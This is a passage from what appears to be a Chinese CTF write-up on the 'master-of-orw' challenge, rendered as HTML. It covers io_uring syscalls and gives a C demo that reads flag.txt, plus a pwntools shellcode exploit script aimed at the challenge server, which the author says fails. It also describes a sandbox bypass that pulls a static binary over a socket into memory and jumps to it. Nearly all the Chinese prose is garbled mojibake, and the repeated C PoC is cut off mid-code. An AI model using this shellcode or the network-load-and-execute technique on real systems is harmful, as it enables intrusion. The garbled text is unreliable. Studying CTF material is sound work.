C">ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨<br>io_uring_setup<br>io_uring_register<br>io_uring_enter<br></code></pre></td></tr></table></figure><p><img src="/img/ACTF/1.png" alt="img"></p><p>å…¶ä¸­<code>io_uring_setup</code> + <code>io_uring_enter</code>å°±å¯ä»¥å®Œæˆç»å¤§éƒ¨åˆ†I&#x2F;Oæ“ä½œã€‚</p><h4 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup"></a>io_uring_setup</h4><p>å…ˆç”¨<code>io_uring_setup</code>è®¾ç½®å¼‚æ­¥I&#x2F;Oæ“ä½œçš„ä¸Šä¸‹æ–‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_setup</span><span class="hljs-params">(u32 entries, <span class="hljs-keyword">struct</span> io_uring_params *p)</span>;<br></code></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ª SQ(<code>submission queu</code>e, æäº¤é˜Ÿåˆ—) å’Œä¸€ä¸ª CQ(<code>completed queue</code>,å®Œæˆé˜Ÿåˆ—ï¼‰</li><li><code>queue size</code> è‡³å°‘ <code>entries</code> ä¸ªå…ƒç´ ï¼Œ</li><li>è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œéšåç”¨äºåœ¨è¿™ä¸ª <code>io_uring</code> å®ä¾‹ä¸Šæ‰§è¡Œæ“ä½œã€‚</li></ul><p>SQ å’Œ CQ åœ¨åº”ç”¨å’Œå†…æ ¸ä¹‹é—´å…±äº«ï¼Œé¿å…äº†åœ¨åˆå§‹åŒ–å’Œå®Œæˆ I&#x2F;O æ—¶<code>ï¼ˆinitiating and completing I/Oï¼‰</code>æ‹·è´æ•°æ®ã€‚</p><p>å‚æ•° pï¼š</p><ul><li>åº”ç”¨ç”¨æ¥é…ç½® <code>io_uring</code>ï¼Œ</li><li>å†…æ ¸è¿”å›çš„ SQ&#x2F;CQ é…ç½®ä¿¡æ¯ä¹Ÿé€šè¿‡å®ƒå¸¦å›æ¥ã€‚</li></ul><p><code>io_uring_setup()</code> æˆåŠŸæ—¶è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦<code>ï¼ˆfdï¼‰</code>ã€‚</p><p>åº”ç”¨éšåå¯ä»¥å°†è¿™ä¸ª fd ä¼ ç»™ <code>mmap(2)</code> ç³»ç»Ÿè°ƒç”¨ï¼Œæ¥ <code>map the submission and completion queues</code> æˆ–è€…ä¼ ç»™ <code>to the io_uring_register() or io_uring_enter() system calls</code>.</p><h4 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter"></a>io_uring_enter</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_enter</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> to_submit, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> min_complete, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags, <span class="hljs-type">sigset_t</span> *sig)</span>;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ç”¨äºåˆå§‹åŒ–å’Œå®Œæˆ<code>ï¼ˆinitiate and completeï¼‰</code>I&#x2F;Oï¼Œä½¿ç”¨å…±äº«çš„ SQ å’Œ CQã€‚ å•æ¬¡è°ƒç”¨åŒæ—¶æ‰§è¡Œï¼š</p><ol><li>æäº¤æ–°çš„ I&#x2F;O è¯·æ±‚</li><li>ç­‰å¾… I&#x2F;O å®Œæˆ</li></ol><p>å‚æ•°ï¼š</p><ol><li><code>fd</code> æ˜¯ <code>io_uring_setup()</code> è¿”å›çš„æ–‡ä»¶æè¿°ç¬¦ï¼›</li><li><code>to_submit</code> æŒ‡å®šäº† SQ ä¸­æäº¤çš„ I&#x2F;O æ•°é‡ï¼›</li></ol><p><code>io_uring_enter()</code> æ”¯æŒå¾ˆå¤šæ“ä½œï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>Open, close, and stat files</li><li>Read and write into multiple buffers or pre-mapped buffers</li><li>Socket I&#x2F;O operations</li><li>Synchronize file state</li><li>Asynchronously monitor a set of file descriptors</li><li>Create a timeout linked to a specific operation in the ring</li><li>Attempt to cancel an operation that is currently in flight</li><li>Create I&#x2F;O chains</li><li>Ordered execution within a chain</li><li>Parallel execution of multiple chains</li></ul><p>å…·ä½“çš„demoå¯ä»¥è®©chatgptå¸®å¿™å†™ä¸€ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–å‚æ•°</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// é…ç½®openæ“ä½œ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// æäº¤openæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// é…ç½®readæ“ä½œ</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">4</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// æäº¤readæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// æäº¤writeæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// ç­‰å¾…æ“ä½œå®Œæˆ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_cqe</span> *<span class="hljs-title">cqe</span>;</span><br>    <span class="hljs-keyword">if</span> (io_uring_wait_cqe(&amp;ring, &amp;cqe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_wait_cqe&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br>   <br>    <span class="hljs-comment">// æäº¤æ‰€æœ‰æ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// æ¸…ç†</span><br>    io_uring_cq_advance(&amp;ring, <span class="hljs-number">2</span>);<br>    io_uring_queue_exit(&amp;ring);<br>    close(fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥è¿›GDBçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆ</p><p>å¯ä»¥çœ‹åˆ°<code>io_uring_queue_init_params</code>å®é™…æ˜¯<code>io_uring_setup</code>å’Œä¸¤ä¸ª<code>mmap</code>çš„å°è£…</p><p><code>io_uring_setup</code>æ‰§è¡Œåè¿”å›fd &#x3D; 3</p><p><img src="/img/ACTF/2.png" alt="img"></p><p>ä¸¤ä¸ª<code>mmap</code>æœ‰æ‰€ä¸åŒï¼Œè¿™ä¸ªç­‰ä¼šå†è®²</p><p><img src="/img/ACTF/3.png" alt="img"></p><p><img src="/img/ACTF/4.png" alt="img"></p><p>è®¾ç¬¬ä¸€ä¸ªmmapå‡ºæ¥çš„å†…å­˜åœ°å€ä¸º<code>mmap_address1</code>ï¼Œç¬¬äºŒä¸ªmmapå‡ºæ¥çš„å†…å­˜åœ°å€ä¸º<code>mmap_address2</code></p><p><code>io_uring_prep_openat</code>å’Œ<code>io_uring_sqe_set_flags</code>å®åˆ™åœ¨å¯¹<code>mmap_address2</code>å¤„çš„sqeç»“æ„ä½“è¿›è¡Œè®¾ç½®</p><p>åé¢çš„<code>io_uring_prep_read/write</code>ä¹Ÿæ˜¯å¦‚æ­¤</p><p>ç¿»çœ‹æºç ï¼Œsqeç»“æ„ä½“å…·ä½“æ˜¯è¿™æ ·çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> &#123;</span><br>__u8opcode;<span class="hljs-comment">/* type of operation for this sqe */</span><br>__u8flags;<span class="hljs-comment">/* IOSQE_ flags */</span><br>__u16ioprio;<span class="hljs-comment">/* ioprio for the request */</span><br>__s32fd;<span class="hljs-comment">/* file descriptor to do IO on */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64off;<span class="hljs-comment">/* offset into file */</span><br>__u64addr2;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u32cmd_op;<br>__u32__pad1;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__u64addr;<span class="hljs-comment">/* pointer to buffer or iovecs */</span><br>__u64splice_off_in;<br>&#125;;<br>__u32len;<span class="hljs-comment">/* buffer size or number of iovecs */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">__kernel_rwf_t</span>rw_flags;<br>__u32fsync_flags;<br>__u16poll_events;<span class="hljs-comment">/* compatibility */</span><br>__u32poll32_events;<span class="hljs-comment">/* word-reversed for BE */</span><br>__u32sync_range_flags;<br>__u32msg_flags;<br>__u32timeout_flags;<br>__u32accept_flags;<br>__u32cancel_flags;<br>__u32open_flags;<br>__u32statx_flags;<br>__u32fadvise_advice;<br>__u32splice_flags;<br>__u32rename_flags;<br>__u32unlink_flags;<br>__u32hardlink_flags;<br>__u32xattr_flags;<br>__u32msg_ring_flags;<br>__u32uring_cmd_flags;<br>&#125;;<br>__u64user_data;<span class="hljs-comment">/* data to be passed back at completion time */</span><br><span class="hljs-comment">/* pack this to avoid bogus arm OABI complaints */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-comment">/* index into fixed buffers, if used */</span><br>__u16buf_index;<br><span class="hljs-comment">/* for grouped buffer selection */</span><br>__u16buf_group;<br>&#125; __attribute__((packed));<br><span class="hljs-comment">/* personality to use, if used */</span><br>__u16personality;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>__s32splice_fd_in;<br>__u32file_index;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u16addr_len;<br>__u16__pad3[<span class="hljs-number">1</span>];<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>__u64addr3;<br>__u64__pad2[<span class="hljs-number">1</span>];<br>&#125;;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If the ring is initialized with IORING_SETUP_SQE128, then</span><br><span class="hljs-comment"> * this field is used for 80 bytes of arbitrary command data</span><br><span class="hljs-comment"> */</span><br>__u8cmd[<span class="hljs-number">0</span>];<br>&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ç¨‹åºä¸­leakè¿™ä¸ªç»“æ„ä½“åº·åº·</p><p><img src="/img/ACTF/5.png" alt="img"></p><p>å‘ç°æ˜¯å»åˆçš„</p><p>è‡³äº<code>io_uring_submit</code>ï¼Œåˆ™æ˜¯<code>io_uring_enter</code>çš„å°è£…</p><p><img src="/img/ACTF/6.png" alt="img"></p><p>OKï¼ŒPocåˆ†æå®Œæ¯•</p><h3 id="è¯•å›¾æ‰‹æ“shellcode"><a href="#è¯•å›¾æ‰‹æ“shellcode" class="headerlink" title="è¯•å›¾æ‰‹æ“shellcode"></a>è¯•å›¾æ‰‹æ“shellcode</h3><p>ç¬”è€…è§‰å¾—æ€»çš„æµç¨‹å°±æ˜¯<code>syscall_io_uring_setup</code>åˆå§‹åŒ–ä¸Šä¸‹æ–‡ï¼Œä¸¤ä¸ª<code>syscall_mmap</code>ï¼Œè®¾ç½®å¥½sqeç»“æ„ä½“å<code>syscall_io_uring_enter</code>æäº¤<code>submisson</code>ã€‚</p><p>Butï¼Œç¬”è€…æ€ä¹ˆæ“éƒ½æ‰“ä¸é€šå‘œå‘œå‘œ&#x2F;(ã„’oã„’)&#x2F;~~</p><p>è¿™è¾¹æ”¾ä¸Šç¬”è€…çš„å¤±è´¥å“ï¼Œå¦‚æœæœ‰masteræ“é€šäº†èƒ½ä¸èƒ½æ•™æ•™å¼Ÿå¼Ÿå‘œå‘œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> ctypes<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(<span class="hljs-string">&#x27;./master-of-orw&#x27;</span>)<br>    p = process(<span class="hljs-string">&quot;./master-of-orw&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>code1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rsi, rdx</span><br><span class="hljs-string">        add rsi, 0x500</span><br><span class="hljs-string">        mov rdi, 0x10</span><br><span class="hljs-string">        push 425</span><br><span class="hljs-string">        pop rax</span><br><span class="hljs-string">        syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>code2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov byte ptr [rax], 0x12</span><br><span class="hljs-string">        mov dword ptr [rax+4], 0xffffff9c</span><br><span class="hljs-string">        mov r15, 0x67616c662f2e</span><br><span class="hljs-string">        push r15</span><br><span class="hljs-string">        mov qword ptr [rax+0x10], rsp</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x40], 0x16</span><br><span class="hljs-string">        mov dword ptr [rax+0x44], 4</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x50], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x58], 0x30</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        mov byte ptr [rax+0x80], 0x17</span><br><span class="hljs-string">        mov dword ptr [rax+0x84], 1</span><br><span class="hljs-string">        push rsp</span><br><span class="hljs-string">        pop r15</span><br><span class="hljs-string">        sub r15, 0x100</span><br><span class="hljs-string">        mov qword ptr [rax+0x90], r15</span><br><span class="hljs-string">        mov byte ptr [rax+0x98], 0x30</span><br><span class="hljs-string">        mov rcx, 3</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = asm(code1, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0</span>)) + \<br>            asm(shellcraft.mmap(<span class="hljs-number">0</span>,<span class="hljs-number">0x380</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x8001</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x10000000</span>)) + \<br>            asm(code2, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>) + \<br>            asm(shellcraft.io_uring_enter(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>))<br><br>gdb.attach(p)<br>sl(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>èƒ½åˆå§‹åŒ–ä½†æ˜¯ä»»åŠ¡æäº¤ä¸ä¸Šå»å‘œå‘œ</p><h3 id="recvfromï¼ï¼"><a href="#recvfromï¼ï¼" class="headerlink" title="recvfromï¼ï¼"></a>recvfromï¼ï¼</h3><p>çœ‹äº†å¥½å‡ ä¸ªå¸ˆå‚…çš„wpå‘ç°éƒ½æ˜¯ç”¨<code>recvfrom</code>åšçš„ï¼Œå› ä¸º<code>socketã€connectã€recvfrom</code>éƒ½æ´»ç€</p><p>å…ˆç”¨gptå†™ä¸€ä¸ªpocï¼Œå…³æ‰pieï¼Œé™æ€ç¼–è¯‘ï¼Œå»ºè®®åŠ ä¸Š-O3ä¼˜åŒ–</p><p>ç”¨<code>mmap</code>æŠŠ0x400000é‚£è¾¹æƒé™æ”¹äº†ï¼Œå»ºç«‹socketè¿æ¥åï¼ŒæŠŠé™æ€é“¾æ¥çš„ç¨‹åºè¯»å…¥0x400000å¤„</p><p>æœ€åjmpåˆ°ä¼ å…¥è¿›å»çš„<code>main</code>å‡½æ•°</p><p>çœŸtmå¦™å•Šï¼Œå¦ˆå¦ˆç”Ÿçš„</p><p>Poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;liburing/io_uring.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 256</span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring</span> <span class="hljs-title">ring</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_params</span> <span class="hljs-title">params</span>;</span><br>    <span class="hljs-type">int</span> fd;<br>    <span class="hljs-type">char</span> buffer[BUFSIZE];<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–å‚æ•°</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;params, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(params));<br>    <span class="hljs-keyword">if</span> (io_uring_queue_init_params(<span class="hljs-number">1</span>, &amp;ring, &amp;params) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;io_uring_queue_init_params&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br><br><br>    <span class="hljs-comment">// é…ç½®openæ“ä½œ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_sqe</span> *<span class="hljs-title">sqe</span> =</span> io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_openat(sqe, AT_FDCWD, <span class="hljs-string">&quot;flag.txt&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>   <br>    <span class="hljs-comment">// æäº¤openæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br><br>    <span class="hljs-comment">// é…ç½®readæ“ä½œ</span><br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_read(sqe, <span class="hljs-number">5</span>, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// æäº¤readæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br>    <br>    sqe = io_uring_get_sqe(&amp;ring);<br>    io_uring_prep_write(sqe, STDOUT_FILENO, buffer, BUFSIZE, <span class="hljs-number">0</span>);<br><br>    io_uring_sqe_set_flags(sqe, IOSQE_ASYNC);<br>    <br>    <br>    <span class="hljs-comment">// æäº¤writeæ“ä½œ</span><br>    io_uring_submit(&amp;ring);<br>    <br>    <span class="hljs-comment">// ç­‰å¾…æ“ä½œå®Œæˆ</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 